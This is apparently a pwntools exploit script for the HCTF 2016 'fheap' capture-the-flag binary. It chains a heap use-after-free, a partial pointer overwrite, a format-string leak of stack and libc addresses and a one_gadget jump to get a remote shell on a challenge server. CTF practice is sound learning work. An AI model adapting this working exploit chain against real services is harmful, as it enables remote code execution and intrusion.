# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './hctf2016_fheap'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
# libc = elf.libc
libc = ELF('./libc-old/libc-2.23.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25771'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sa('3.quit\n',num)

def add(size , text):
    cmd('create \x00')
    sla('size' , size)
    sa('str:' , text)

def delete(idx ):
    cmd('delete \x00')
    sla('id' , idx)
    sla('Are you sure?' , 'yes')

ogg = one_gadget(libc.path)

add(0x18 , 'a\x00')
add(0x18 , 'a\x00')

delete(1)
delete(0)

add(0x28 , '%26$p,%38$p'.ljust(0x18,'a') + '\xB6' )
# 这里 ha1vk 师傅真是太帅了，本来我只能想到输出堆地址，居然把格式化字符串忘了
# dbg('strncmp')
delete(1)

ru('0x')
stack = rint() - 0x618
ru(',0x')
printf_addr = rint() - 362

libc.address = printf_addr - libc.sym['puts']
ogg = ogg[2] + libc.address 

lg('stack',stack)
lg('libc.address',libc.address)

sl('0')
sla('Are you sure?' , 'yes'.ljust(0x100 ,'\x00') )

add(0x28 , 'a'*0x18 + p64(ogg))

# dbg('strncmp')
delete(1)

# dbg()

p.interactive()

'''
@File    :   hctf2016_fheap.py
@Time    :   2021/09/24 20:58:30
@Author  :   Niyah 
'''